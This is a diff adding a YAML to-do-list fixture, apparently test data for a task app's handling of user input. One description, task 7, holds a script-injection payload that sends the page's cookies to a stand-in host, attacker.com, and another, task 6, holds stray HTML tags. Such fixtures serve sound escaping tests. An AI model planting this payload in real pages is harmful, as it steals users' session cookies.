@@ -1,0 +1,25 @@
+---
+tasks:
+- id: 1
+  title: Pet Suki
+  description: She wants love!
+- id: 2
+  title: Make cookies
+  description: Cookies are love
+- id: 3
+  title: put tape on cars
+  description: so I can paint them again
+- id: 4
+  title: Do stuff
+  description: "cuz stuff\r\n"
+- id: 5
+  title: Do stuff
+  description: cuz stuff
+- id: 6
+  title: Do stuff
+  description: "<b>fancy<blink>tags"
+- id: 7
+  title: Do stuff
+  description: "'><script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi
+    ?foo='+document.cookie</script>'."
+total: 7
